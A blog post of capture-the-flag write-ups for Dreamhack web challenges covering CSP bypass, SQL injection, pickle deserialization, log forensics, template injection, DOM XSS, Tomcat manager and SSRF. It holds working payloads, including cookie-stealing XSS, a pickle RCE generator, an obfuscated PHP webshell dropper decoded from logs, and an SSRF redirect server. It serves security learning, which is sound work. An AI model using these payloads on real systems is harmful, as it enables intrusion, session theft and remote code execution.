---
title: Dreamhack (5)
published: 2025-01-05
category: Writeups
tags: [web, dh, dreamhack, ctf]
image: "./image/titles/dreamhack.png"
description: Some cool and fun web challenges from dreamhack.
draft: false
---

# Web Hacking

## CSP Bypass

[Challenge](https://dreamhack.io/wargame/challenges/435)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/b0041980-1dc9-47b5-8d3a-793fb4159440.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250530%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250530T164540Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=efb1437ccc22984e1652e55ce0833bc0e80888f404408cab27fa4e5834f67574)

When I read carefully about `bypassing CSP`, I found that if the `domain` name is correct, all types of tags can be executed or the `nonce` must be correct to run, I tried with payload: `<script src="/vuln?param=location.href='http://127.0.0.1:8000/memo?memo='+document.cookie"></script>`
this way, `/flag` will load the script and the browser will see `<script src="/vuln?...` then it will send requests to the same `domain` and will execute that command. That way, after checking and being valid, the cookie at the root will be added to `/memo`

one thing we need to encode the `+` sign in the browser because it will be misunderstood as a `space`

![image](./image/dreamhack/74.png)

---

## baby-sqlite

[Challenge](https://dreamhack.io/wargame/challenges/1)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/325ad43d-0f5d-4658-9558-405256f505c4.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250530%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250530T174410Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=9807866f71accc0e1b13a18cb99593a389148829691a474f1d2264053f4871ee)

In this challenge we can see that to get the `flag` we need to make the result have the string `admin`, but the original database does not have `admin`. Looking at the `query` string we can see that we can attack the `level` in the simplest way, I have joined the query results with `UNION` to print out the string `admin`.

* bypass spaces with `%20`, `/**/`, etc.
* bypass strings with `||` to concatenate them.

Our problem is that `select` is banned so we can't use it, instead, let's look again this is `SQLite` so there is another data type that can be executed similarly which is `VALUES`

`payload` : `uid=a&upw=b&level=1/**/UNION/**/VALUES(char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))`

![image](./image/dreamhack/75.png)

---

## web-deserialize-python

[Challenge](https://dreamhack.io/wargame/challenges/40)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/85f040dd-4095-4eb7-b5e3-cc1f142db111.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250530%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250530T181357Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=ac85bc8377b16b972c97c1527644c0ce4b77dac66468244abf5e1853587b5acb)

`app.py`

```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, redirect
import os, pickle, base64

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

INFO = ['name', 'userid', 'password']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create_session', methods=['GET', 'POST'])
def create_session():
    if request.method == 'GET':
        return render_template('create_session.html')
    elif request.method == 'POST':
        info = {}
        for _ in INFO:
            info[_] = request.form.get(_, '')
        data = base64.b64encode(pickle.dumps(info)).decode('utf8')
        return render_template('create_session.html', data=data)

@app.route('/check_session', methods=['GET', 'POST'])
def check_session():
    if request.method == 'GET':
        return render_template('check_session.html')
    elif request.method == 'POST':
        session = request.form.get('session', '')
        info = pickle.loads(base64.b64decode(session))
        return render_template('check_session.html', info=info)

app.run(host='0.0.0.0', port=8000)
```

`Pickle Deserialization Vulnerability in Flask`

The Flask application uses `pickle.loads()` to decode a user-supplied session string without checking for safety. This leads to remote code execution `(RCE)` when an attacker sends a `malicious` payload.

```python
session = request.form.get('session', '')
info = pickle.loads(base64.b64decode(session))
```

Pickle in Python has the ability to execute arbitrary functions upon deserialization if an attacker modifies the `__reduce__` method.

`script`

```python
import pickle, base64

class test:
    def __reduce__(self):
        p = "__import__('os').popen('ls').read()"
        return (eval, (p,))

result = {'name': test()}

print(base64.b64encode(pickle.dumps(result)).decode('utf8'))
#gASVSQAAAAAAAAB9lIwEbmFtZZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIwjX19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCmUhZRSlHMu
```

![image](./image/dreamhack/76.png)

![image](./image/dreamhack/77.png)

---

## Test Your Luck

[Challenge](https://dreamhack.io/wargame/challenges/1955)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/2df8db1e-dd55-4e48-bd9a-47baf5a800c1.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250601%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250601T001052Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=9cd18edc32a1c616f487aa018a8c9205f312cd4b5e9fa828cb5df992f8c987b9)

The flaw in this challenge is that it doesn't reload the web every time it guesses so it can be bruteforced.

![image](./image/dreamhack/78.png)

![image](./image/dreamhack/79.png)

![image](./image/dreamhack/80.png)

---

## weblog-1

[Challenge](https://dreamhack.io/wargame/challenges/71)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/842d350b-53b6-4771-81ff-b78aa6e68eca.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250601%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250601T012155Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=be7dab71ce7fabca687979e64211b3dd7d6ec4b9495233d8412a8133d667c862)

in this challenge is quite interesting because we have to analyze logs for penetration testing specifically `sqli`, accordingly we in the first question need to know `admin password` and can find them in `access.log`

![image](./image/dreamhack/81.png)

After a while, in the access.log, I saw that it was a `blind sql` exploit, so I tried to search the database and found the following command: `if(ord(substr(database(), 1, 1)) = 32, (select 1 union select 2), 0)`

![image](./image/dreamhack/82.png)

This query checks the `ascii` of the first character of the `database name` to see if it is `32` or not. If it is `true`, it returns lines `1` and `2`. If it is false, it returns `0`.

I used the `cat access.log | grep -i ',%20(select%201%20union%20select%202),%200) HTTP/1.1' | grep -i 'if(ord(substr(database(),%20'` command to print out the `bruteforce` queries named `database()` but it still seemed like a lot so I used `linux` for more convenience

```shell
└─$ grep 'if(ord(substr(database(),%20' access.log | awk '$10 != 841'                                                       

172.17.0.1 - - [02/Jun/2020:09:11:09 +0000] "GET /board.php?sort=if(ord(substr(database(),%201,1))=115,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:11:51 +0000] "GET /board.php?sort=if(ord(substr(database(),%202,1))=105,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:12:52 +0000] "GET /board.php?sort=if(ord(substr(database(),%203,1))=109,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:13:46 +0000] "GET /board.php?sort=if(ord(substr(database(),%204,1))=112,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:14:38 +0000] "GET /board.php?sort=if(ord(substr(database(),%205,1))=108,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:15:32 +0000] "GET /board.php?sort=if(ord(substr(database(),%206,1))=101,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:16:23 +0000] "GET /board.php?sort=if(ord(substr(database(),%207,1))=95,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:17:19 +0000] "GET /board.php?sort=if(ord(substr(database(),%208,1))=98,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:18:05 +0000] "GET /board.php?sort=if(ord(substr(database(),%209,1))=111,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:18:50 +0000] "GET /board.php?sort=if(ord(substr(database(),%2010,1))=97,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:19:43 +0000] "GET /board.php?sort=if(ord(substr(database(),%2011,1))=114,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
172.17.0.1 - - [02/Jun/2020:09:20:15 +0000] "GET /board.php?sort=if(ord(substr(database(),%2012,1))=100,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

The reason the server returns 500 is due to the logic in the `board.php` code.

```php
$result = mysqli_query($conn, $sql) or die(error(500));
```

Here we can see the database name is each of those characters when combined.

`script`

```python
import re
from collections import defaultdict

db_name_chars = defaultdict(str)

with open("dbname.txt", "r", encoding="utf-8") as f:
    for line in f:
        match = re.search(r'ord\(substr\(database\(\),%20([0-9]+),1\)\)=([0-9]+)', line)
        if match:
            pos = int(match.group(1))    
            ascii_code = int(match.group(2))
            char = chr(ascii_code)
            db_name_chars[pos] = char
            print(f"[pos {pos}] ASCII {ascii_code} = '{char}'")

if db_name_chars:
    database_name = ''.join(db_name_chars[pos] for pos in sorted(db_name_chars))
    print("\n Database name recovered:", database_name)
```

![image](./image/dreamhack/83.png)

`db name: simple_board`

Next we can see another type of `payload` : `if(ord(substr((select group_concat(TABLE_NAME,0x3a,COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA=database()), 1,1))=32, (select 1 union select 2), 0)`

In this `payload`, we use it to scan the `table` name and `column` names in turn and check if its first character is the value `x` or not.

similarly i retrieved the lines using `linux` and got the value using `python`

![image](./image/dreamhack/84.png)

`payload` 

```shell
grep -i "if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%20" access.log | awk '$10 == 1192'
```

```python
import re
from collections import defaultdict

db_name_chars = defaultdict(str)

with open("tablename_columnname.txt", "r", encoding="utf-8") as f:
    for line in f:
        # match = re.search(r'ord\(substr\(database\(\),%20([0-9]+),1\)\)=([0-9]+)', line)
        match = re.search(r'ord\(substr\(\(select%20group_concat\(TABLE_NAME,0x3a,COLUMN_NAME\)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database\(\)\),%20([0-9]+),1\)\)=([0-9]+)', line)
        # if(ord\(substr\(\(select%20group_concat\(TABLE_NAME,0x3a,COLUMN_NAME\)%20from%20information_schema\.columns%20where%20TABLE_SCHEMA=database\(\)\),%20([0-9]+),1\)\)=([0-9]+)
        if match:
            pos = int(match.group(1))    
            ascii_code = int(match.group(2))
            char = chr(ascii_code)
            db_name_chars[pos] = char
            print(f"[pos {pos}] ASCII {ascii_code} = '{char}'")

if db_name_chars:
    database_name = ''.join(db_name_chars[pos] for pos in sorted(db_name_chars))
    print("\n Database name recovered:", database_name)
```

`board:idx,board:title,board:contents,board:writer,users:idx,users:username,users:password,users:level`

we see that there are 2 tables and the `password` we need is in the `users` table

In the next payload we can find that the hacker has continued to use blind injection to exploit and find all the users and passwords.

`if(ord(substr((select group_concat(username,0x3a,password) from users), 1,1))=32,%20(select 1 union select 2), 0)`

```shell
grep -i "if(ord(substr((select%20group_concat(username,0x3a,password)%20from%20users),%20" access.log | awk '$10 == 1192' > user_password.txt
```

![image](./image/dreamhack/85.png)

![image](./image/dreamhack/86.png)

Found admin password : `Th1s_1s_Adm1n_P@SS`

![image](./image/dreamhack/87.png)

in the next question we can see the request to find the payload that the `hacker` used to get the `config.php` file. look in the `access.log` and we will see that it is an `LFI vulnerability`

![image](./image/dreamhack/88.png)

![image](./image/dreamhack/89.png)

`php://filter/convert.base64-encode/resource=../config.php`

![image](./image/dreamhack/90.png)

in question 2 we need to find the path to the file that the hacker used to execute `LFI` (I found them at the end of the `access.log` file)

![image](./image/dreamhack/91.png)

I decoded to see the code inserted but it seems they are used to read the contents of `images.php` and add the variable c to execute the `command`

```php
%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E
```

![image](./image/dreamhack/92.png)

```php
<?php function 
m($l,$T=0){
    $K=date('2020-06-02');
    $_=strlen($l);
    $__=strlen($K);
    for($i=0;$i<$_;$i++){
        for($j=0;$j<$__; $j++){
            if($T){
                $l[$i]=$K[$j]^$l[$i];
            }
            else{
                $l[$i]=$l[$i]^$K[$j];
            }
        }
    }
    return $l;
} 
// m('bmha[tqp[gkjpajpw')(m('+rev+sss+lpih+qthke`w+miecaw*tlt'),m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?')); 



echo m('bmha[tqp[gkjpajpw')."\n";
echo m('+rev+sss+lpih+qthke`w+miecaw*tlt')."\n";
echo m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?')."\n";
```

`result`

```
file_put_contents
/var/www/html/uploads/images.php
<?php header("HTTP/1.1 404 Not Found");system($_GET["c"]);
```

It can be seen that the `hacker` executed the command without getting much result. However, the important thing is that we found a rather suspicious file: `/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732`

![image](./image/dreamhack/93.png)

![image](./image/dreamhack/94.png)

Coincidentally the third question is inside the code inserted after we decode it.

![image](./image/dreamhack/95.png)

![image](./image/dreamhack/96.png)

in this last sentence when entering the first command and the `webshell` executes it is from `images.php` that is the `whoami` command

![image](./image/dreamhack/97.png)

![image](./image/dreamhack/98.png)

![image](./image/dreamhack/99.png)

---

## [wargame.kr] md5 password

[Challenge](https://dreamhack.io/wargame/challenges/337)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/26a519f3-ba9c-47aa-86e4-96d4801314f7.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250603%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250603T231658Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=0b75c505aebac0bb9f240f7e25a730d5e4d7b418cfd9ea8a8e524bd6b6667b86)

In this challenge we need to enter an input, through the function `md5(..., true)` will give `raw binary data`, then if the result has a return line, it will display a `flag`. Specifically, after a while of searching I found a great `website` with similar logic, they discovered a string that when the input after raw will contain the string `'or'` will misunderstand the query logic into `password` is anything and then a string. We can ignore the password before `or` because it is wrong `or` right is not important, if wrong will rely on after or to continue querying, but of course if it is a string then it is always correct, the return command is correct and will display all the information.

`payload`

```
ffifdyop
129581926211651571912466741651878684928
```

![image](./image/dreamhack/100.png)

![image](./image/dreamhack/101.png)

**Note**

web at [here](https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)

---

## Client Side Template Injection

[Challenge](https://dreamhack.io/wargame/challenges/437)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/3a287c59-e4ff-49c9-9b96-84c0efcf1c91.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250604%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250604T040353Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=e72d5cbcb6987f58e2c25d66d695636467859486585547169af0da4e4fa03942)

In this challenge, we focus on the `CSP` provided:

`script-src`
Identify the source that is allowed to load and execute `JavaScript scripts` in the page.

`'unsafe-eval'`: Allows the use of dangerous JavaScript functions such as: `eval()` , `new Function()` , `setTimeout("...")` with strings

This is very dangerous, as it opens the way for `JavaScript` code to be executed from strings – something that modern browsers try to prevent.

[https://ajax.googleapis.com](https://ajax.googleapis.com)
Allows loading and executing scripts from Google's CDN (e.g. AngularJS, jQuery...).

Why is `'unsafe-eval'` dangerous?

Without `'unsafe-eval'` in the `CSP`, expressions like `new Function("alert(1)")()` will be blocked.

With `'unsafe-eval'`, attackers can use tricks like:

{% raw %}
```{{constructor.constructor("alert(1)")()}}```
{% endraw %}

to test use:

```html
<!DOCTYPE html>
<html ng-app>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
</head>
<body>
<div>
{% raw %}
```{{constructor.constructor("alert(1)")()}}```
{% endraw %}
</div>
</body>
</html>
```
at `/vuln`

![image](./image/dreamhack/102.png)

it worked, now change to get `cookie` and send it to `memo`

`payload`

```javascript
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
<html ng-app>
{% raw %}
  {{constructor.constructor("location='memo?memo='+document.cookie")()}}
{% endraw %}
</html>
```

![image](./image/dreamhack/103.png)

---

## DOM XSS

[Challenge](https://dreamhack.io/wargame/challenges/438)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/b9ded3f1-8c20-476d-8aca-210b1cd54eab.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250603%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250603T231311Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=8305b21b0292c0fbbb92c18454d8682275b188f94510bc4e876ffe6e313ac0e4)

`app.py`

```python
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, name, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}#{name}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}' 'strict-dynamic'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return render_template("vuln.html", nonce=nonce, param=param)


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        name = request.form.get("name")
        if not check_xss(param, name, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)


app.run(host="0.0.0.0", port=8000)
```

we are given a `CSP` snippet:

* default-src 'self'; default is to allow your own domain

* img-src https://dreamhack.io ; Allow images from dreamhack.io

* style-src 'self' 'unsafe-inline'; Allow inline JavaScript and CSS (e.g. style, onclick, or script tag body attributes)

* script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; Allow a script or CSS to run if it contains a nonce attribute that matches the specified nonce.

and in `vuln.html` we can see:

![image](./image/dreamhack/104.png)

here:
It reads data from `location.hash` and inserts into DOM (innerHTML) without escaping

![image](./image/dreamhack/105.png)

`payload`

```shell
location.href='http://127.0.0.1:8000/memo?memo='+document.cookie//
```

![image](./image/dreamhack/106.png)

---

## Tomcat Manager

[Challenge](https://dreamhack.io/wargame/challenges/248)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/0b858989-4f51-4438-ba31-9bdfd259f59c.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250604%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250604T060423Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=94439ebe1578fa49c9450514bedcdc56df7e8d5f1cabb8ee940f6d1dc5890af3)

After some time of `analysis` and `searching`, I found that in this challenge there is a system management endpoint at `/manager/html` to `manage` and `deploy`, what we need to do is find the `password`.

![image](./image/dreamhack/107.png)

![image](./image/dreamhack/108.png)

we know that the `name` is `tomcat` and the `password` is `secret`, looking at the `source code` i think it is a `path traversal file` so i tried to find the path to the content of `conf/tomcat-users.xml` as mentioned in `Docker` to see

![image](./image/dreamhack/109.png)

![image](./image/dreamhack/110.png)

![image](./image/dreamhack/111.png)

`password is P2assw0rd_4_t0mC2tM2nag3r31337`

![image](./image/dreamhack/112.png)

came here after a while `searching` i think i should deploy `webshell` to `RCE` this system

webshell at [here](https://github.com/BustedSec/webshell/blob/master/webshell.war)

![image](./image/dreamhack/113.png)

![image](./image/dreamhack/114.png)

![image](./image/dreamhack/115.png)

---

## crawling

[Challenge](https://dreamhack.io/wargame/challenges/274)
[Source](https://sfo2.digitaloceanspaces.com/wargame1/public/682e3a22-bac3-4811-977e-41898492bace.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=OIK4A6AORYFTHBTQUV55%2F20250604%2Fsfo2%2Fs3%2Faws4_request&X-Amz-Date=20250604T204403Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=5fe6639e196afdade0ece2a4941a746403ac2276351de2d501302b7a0f5390e7)

`app.py`

```python
#app.py
from re import split
import socket
import requests
import ipaddress
from urllib.parse import urlparse
from flask import Flask, request, render_template

app = Flask(__name__)
app.flag = '__FLAG__'

def lookup(url):
    try:
        return socket.gethostbyname(url)
    except:
        return False

def check_global(ip):
    try:
        return (ipaddress.ip_address(ip)).is_global
    except:
        return False

def check_get(url):
    ip = lookup(urlparse(url).netloc.split(':')[0])
    if ip == False or ip =='0.0.0.0':
        return "Not a valid URL."
    res=requests.get(url)
    if check_global(ip) == False:
        return "Can you access my admin page~?"
    for i in res.text.split('>'):
        if 'referer' in i:
            ref_host = urlparse(res.headers.get('refer')).netloc.split(':')[0]
            if ref_host == 'localhost':
                return False
            if ref_host == '127.0.0.1':
                return False 
    res=requests.get(url)
    return res.text

@app.route('/admin')
def admin_page():
    if request.remote_addr != '127.0.0.1':
    		return "This is local page!"
    return app.flag

@app.route('/validation')
def validation():
    url = request.args.get('url', '')
    ip = lookup(urlparse(url).netloc.split(':')[0])
    res = check_get(url)
    return render_template('validation.html', url=url, ip=ip, res=res)

@app.route('/')
def index():
    return render_template('index.html')

if __name__=='__main__':
    app.run(host='0.0.0.0', port=3333)
```

We are provided with a website that has the function of entering the url and will display the ip and the returned information. The process includes entering the `url`, then going through the `lookup()` function to resolve the `ip` of that `url`, then checking if the ip is `public`, if `public`, we will send a `request` to it and receive the returned `content`. At this `point`, we can plan to fake the `url` that it is `public` and then `redirect` it to the `local ip`, port `3333` according to the `source` code with the endpoint being `/admin`. That way we can bypass everything.

`script`

```python
from flask import Flask, redirect
import sys

app = Flask(__name__)

@app.route('/')
def exploit():
    return redirect("http://127.0.0.1:3333/admin", code=302)

@app.route('/test')
def test():
    return "Redirect server is working!"

if __name__ == '__main__':
    print("Starting redirect server...")
    print("This will redirect to: http://127.0.0.1:3333/admin")
    app.run(host='0.0.0.0', port=5000, debug=True)
```

so i use `ngrok` to public 

![image](./image/dreamhack/116.png)

![image](./image/dreamhack/117.png)

![image](./image/dreamhack/118.png)

**NOTE**
setup `ngrok` at [here](https://ngrok.com/downloads/linux)

---